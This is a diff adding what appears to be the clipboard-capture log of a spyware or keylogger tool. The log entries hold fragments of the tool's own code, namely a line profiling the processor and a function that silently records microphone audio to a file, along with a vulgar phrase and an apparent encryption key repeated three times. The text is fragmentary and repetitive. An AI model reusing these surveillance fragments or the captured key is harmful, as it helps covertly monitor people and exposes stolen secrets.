@@ -1,0 +1,24 @@
+Clipboard Data: 
+f.write("Processor: " + (platform.processor()) + '\n')
+Clipboard Data:
+rp gadu manchodu
+Clipboard Data: 
+def microphone():
+    fs = 44100
+    seconds = microphone_time
+    
+    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+    sd.wait()
+    
+    write(file_path + audio_information, fs, myrecording)Clipboard Data: 
+def microphone():
+    fs = 44100
+    seconds = microphone_time
+    
+    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+    sd.wait()
+    
+    write(file_path + audio_information, fs, myrecording)Clipboard Data: 
+31E6THWv8JiffSOype6mTsE--IJZAno_26S3wVjZsik=Clipboard Data: 
+31E6THWv8JiffSOype6mTsE--IJZAno_26S3wVjZsik=Clipboard Data: 
+31E6THWv8JiffSOype6mTsE--IJZAno_26S3wVjZsik=
